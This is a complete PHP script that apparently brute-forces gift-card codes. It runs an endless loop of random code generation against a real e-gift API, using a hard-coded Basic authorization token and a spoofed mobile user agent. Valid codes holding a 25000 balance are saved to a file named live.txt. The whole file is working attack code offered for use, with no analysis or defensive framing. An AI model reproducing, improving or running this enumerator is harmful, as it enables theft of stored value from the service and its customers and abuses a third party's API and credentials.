<?php error_reporting(0); class curl { 	var $ch, $agent, $error, $info, $cookiefile, $savecookie;	 	function curl() { 		$this->ch = curl_init(); 		curl_setopt ($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.164.0 Safari/530.1'); 		curl_setopt ($this->ch, CURLOPT_HEADER, 1); 		curl_setopt ($this->ch, CURLOPT_RETURNTRANSFER, 1); 		curl_setopt ($this->ch, CURLOPT_SSL_VERIFYPEER, 0); 		curl_setopt ($this->ch, CURLOPT_SSL_VERIFYHOST, 0); 		curl_setopt ($this->ch, CURLOPT_FOLLOWLOCATION,true); 		curl_setopt ($this->ch, CURLOPT_TIMEOUT, 30); 		curl_setopt ($this->ch, CURLOPT_CONNECTTIMEOUT,30); 	} 	function header($header) { 		curl_setopt ($this->ch, CURLOPT_HTTPHEADER, $header); 	} 	function timeout($time){ 		curl_setopt ($this->ch, CURLOPT_TIMEOUT, $time); 		curl_setopt ($this->ch, CURLOPT_CONNECTTIMEOUT,$time); 	} 	function http_code() { 		return curl_getinfo($this->ch, CURLINFO_HTTP_CODE); 	} 	function error() { 		return curl_error($this->ch); 	} 	function ssl($veryfyPeer, $verifyHost){ 		curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, $veryfyPeer); 		curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, $verifyHost); 	} 	function cookies($cookie_file_path) { 		$this->cookiefile = $cookie_file_path;; 		$fp = fopen($this->cookiefile,'wb');fclose($fp); 		curl_setopt ($this->ch, CURLOPT_COOKIEJAR, $this->cookiefile); 		curl_setopt ($this->ch, CURLOPT_COOKIEFILE, $this->cookiefile); 	} 	function post($url, $data) { 		curl_setopt($this->ch, CURLOPT_POST, 1);	 		curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data); 		return $this->getPage($url); 	} 	function data($url, $data, $hasHeader=true, $hasBody=true) { 		curl_setopt ($this->ch, CURLOPT_POST, 1); 		curl_setopt ($this->ch, CURLOPT_POSTFIELDS, http_build_query($data)); 		return $this->getPage($url, $hasHeader, $hasBody); 	} 	function get($url, $hasHeader=true, $hasBody=true) { 		curl_setopt ($this->ch, CURLOPT_POST, 0); 		return $this->getPage($url, $hasHeader, $hasBody); 	}	 	function getPage($url, $hasHeader=true, $hasBody=true) { 		curl_setopt($this->ch, CURLOPT_HEADER, $hasHeader ? 1 : 0); 		curl_setopt($this->ch, CURLOPT_NOBODY, $hasBody ? 0 : 1); 		curl_setopt ($this->ch, CURLOPT_URL, $url); 		$data = curl_exec ($this->ch); 		$this->error = curl_error ($this->ch); 		$this->info = curl_getinfo ($this->ch); 		return $data; 	} } function fetchCurlCookies($source) { 	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $source, $matches); 	$cookies = array(); 	foreach($matches[1] as $item) { 		parse_str($item, $cookie); 		$cookies = array_merge($cookies, $cookie); 	} 	return $cookies; } function string($length) { 	$characters = '0123456789abcdefghijklmnopqrstuvwxyz'; 	$charactersLength = strlen($characters); 	$randomString = ''; 	for ($i = 0; $i < $length; $i++) { 		$randomString .= $characters[rand(0, $charactersLength - 1)]; 	} 	return $randomString; } function angka($length) { 	$characters = '0123456789'; 	$charactersLength = strlen($characters); 	$randomString = ''; 	for ($i = 0; $i < $length; $i++) { 		$randomString .= $characters[rand(0, $charactersLength - 1)]; 	} 	return $randomString; } function fetch_value($str,$find_start,$find_end) { 	$start = @strpos($str,$find_start); 	if ($start === false) { 		return ""; 	} 	$length = strlen($find_start); 	$end = strpos(substr($str,$start +$length),$find_end); 	return trim(substr($str,$start +$length,$end)); } $curl = new curl(); $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt'); $curl->ssl(0, 2); $headers = array(); $headers[] = "Authorization: Basic MXVxTXdpRHZzUXdCZjNUdjNCUGZuZ2laaDpiZ3hCNkliT0hpWTl1NE96eDFqaXV1MUFMb0ZaZkZUbmM5b3A2ekFRc3NrcUZRcGVJbw=="; $headers[] = "Origin: https://e.gift.id"; $headers[] = "Accept-Language: en-US,en;q=0.9"; $headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"; $headers[] = "Accept: application/json, text/plain, */*"; $headers[] = "Connection: keep-alive"; $curl->header($headers); while (true) { 	$code = array(); 	$code[0] = '83'.string(8).angka(3); 	$code[1] = '83'.string(9).angka(2); 	$code[2] = '83'.string(9).'46'; 	$random = rand(0,2); 	$asw = $code[$random]; 	$page = $curl->get('https://api.gift.id/v1/egifts/detail_by_code/'.$asw.''); 	if (stripos($page, 'replyCardBalance')) { 		preg_match_all('/"number":"(.*?)","amount":25000/', $page, $tada); 		echo "Code: ".$tada[1][1]; 		echo "\n"; 		$data = "Code: ".$tada[1][1]."\r\n"; 		$fh = fopen("live.txt", "a"); 		fwrite($fh, $data); 		fclose($fh); 		flush(); 		ob_flush(); 	} elseif (stripos($page, 'eVoucher not found')) { 		echo "Failed: ".$asw; 		echo "\n"; 		flush(); 		ob_flush(); 	} } ?> 
